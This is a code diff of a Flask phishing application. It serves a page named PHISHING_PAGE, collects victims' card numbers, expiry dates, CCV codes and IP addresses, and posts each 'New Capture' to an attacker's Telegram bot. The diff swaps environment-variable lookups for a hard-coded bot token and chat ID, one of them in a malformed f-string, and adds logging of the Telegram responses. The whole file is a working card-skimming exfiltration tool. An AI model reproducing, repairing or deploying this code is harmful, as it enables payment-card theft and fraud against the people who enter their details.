@@ -3,9 +3,9 @@ import logging
 from flask import Flask, request, redirect, render_template_string
 import requests
 
-# SAFE CONFIGURATION - USE RAILWAY ENV VARS ONLY
-TELEGRAM_BOT_TOKEN = os.environ.get('8887245058:AAGeopviTcxIffuEf4LkRWPhxNbNEi1Q-lg')
-TELEGRAM_CHAT_ID = os.environ.get('8790611176')
+# CONFIGURATION - SET THESE IN RAILWAY VARIABLES DASHBOARD
+TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
+TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -79,14 +79,24 @@ PHISHING_PAGE = """
 
 def send_telegram(message):
     if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
-        logger.warning("Telegram credentials missing")
+        logger.error("CRITICAL: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is missing from Railway env vars")
         return
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
+    
+    url = f"https://api.telegram.org/bot{8887245058:AAGeopviTcxIffuEf4LkRWPhxNbNEi1Q-lg}/sendMessage"
+    payload = {
+        "chat_id": 8790611176,
+        "text": message,
+        "parse_mode": "HTML"
+    }
+    
     try:
-        requests.post(url, json=payload, timeout=5)
+        resp = requests.post(url, json=payload, timeout=5)
+        logger.info(f"Telegram API Response: {resp.status_code} | {resp.text}")
+        resp.raise_for_status()
+    except requests.exceptions.HTTPError as e:
+        logger.error(f"Telegram HTTP Error: {e.response.text}")
     except Exception as e:
-        logger.error(f"Telegram error: {e}")
+        logger.error(f"Telegram Request Failed: {str(e)}")
 
 @app.route('/')
 def index():
@@ -102,11 +112,11 @@ def verify_card():
     
     message = (
         f"🚨 <b>New Capture</b>\n"
-        f"💳 <b>Card:</b> <code>{card_number}</code>\n"
-        f"📅 <b>Expiry:</b> {expiry}\n"
-        f" <b>CCV:</b> {ccv}\n"
+        f" <b>Card:</b> <code>{card_number}</code>\n"
+        f" <b>Expiry:</b> {expiry}\n"
+        f"🔐 <b>CCV:</b> {ccv}\n"
         f"🔑 <b>CID:</b> {cid}\n"
-        f"🌐 <b>IP:</b> {ip}"
+        f" <b>IP:</b> {ip}"
     )
     
     send_telegram(message)
